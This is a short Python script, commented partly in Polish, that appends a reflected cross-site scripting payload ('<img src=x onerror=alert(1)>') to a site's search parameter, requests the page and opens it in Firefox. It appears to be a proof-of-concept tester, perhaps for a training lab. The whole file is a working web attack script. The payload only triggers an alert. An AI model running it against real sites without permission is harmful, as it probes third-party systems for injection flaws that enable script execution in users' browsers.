import sys
import requests
import webbrowser

def main():
    if len(sys.argv) != 2:
        print("Usage: python3 script.py <URL>")
        sys.exit(1)

    base_url = sys.argv[1]
    modified_url = base_url + "/?search=<img+src=x+onerror=alert%281%29>"

    try:
        response = requests.get(modified_url)
        print(f"Modified URL: {modified_url}")
        print(f"Status code: {response.status_code}")
#        print(f"Treść odpowiedzi POST: {response.text}")

        # Otwieranie w przeglądarce Firefox
        webbrowser.get('firefox').open(modified_url)

    except requests.exceptions.RequestException as e:
        print(f"An error occurred: {e}")

if __name__ == "__main__":
    main()
